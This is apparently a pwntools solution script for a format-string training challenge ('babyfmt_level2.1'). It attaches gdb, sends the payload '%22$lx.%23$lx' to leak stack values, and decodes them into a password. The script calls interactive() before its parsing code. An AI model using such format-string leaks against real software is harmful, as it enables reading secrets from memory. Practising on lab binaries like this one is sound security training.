from pwn import * 

binary = './babyfmt_level2.1'

p = process(binary)

s = '''
b * printf
'''


gdb.attach(p, s)

p.sendline("%22$lx.%23$lx")

p.interactive()


p.recvuntil("I will now call printf on your data!\n\n")

leak = p.recvline().strip().decode()

first, second = leak.split(".")

first = bytes.fromhex(first).decode()[::-1]
second = bytes.fromhex(second).decode()[::-1]


password = first + second

print(password)





